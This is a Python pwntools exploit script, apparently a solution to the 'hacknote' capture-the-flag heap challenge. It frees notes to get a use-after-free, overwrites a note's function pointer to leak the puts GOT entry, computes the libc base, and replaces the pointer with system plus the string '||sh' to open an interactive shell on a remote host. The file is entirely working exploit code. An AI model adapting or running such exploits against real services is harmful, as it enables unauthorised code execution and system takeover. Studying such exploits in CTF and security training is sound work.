#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import binascii
DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./pwn")
	elf = ELF("./pwn")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	puts_got = elf.got["puts"]
	
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("111.198.29.45","37529")
	elf = ELF("./hacknote.dms")
	libc = ELF("./libc-2.23.so")
	puts_got = elf.got["puts"]

def Add(size,content):
	io.sendlineafter("Your choice :","1")
	io.sendlineafter("Note size :",str(size))
	io.sendafter("Content :",content)

def Delete(index):
	io.sendlineafter("Your choice :","2")
	io.sendlineafter("Index :",str(index))

def Print(index):
	io.sendlineafter("Your choice :","3")
	io.sendlineafter("Index :",str(index))
#gdb.attach(io,"b *0x08048B01")
Add(24,24*"a")
Add(24,24*"a")
Delete(0)
Delete(1)
Add(8,p32(0x804862b)+p32(puts_got))
Print(0)
info = io.recv()
puts_addr = u32(info[:4])
print hex(puts_addr)
io.sendline()
libc_base = puts_addr - libc.symbols["puts"]
log.info("lib_base:"+hex(libc_base))
system_addr = libc.symbols["system"] + libc_base
Delete(2)
Add(8,p32(system_addr)+"||sh")
Print(0)
io.interactive()
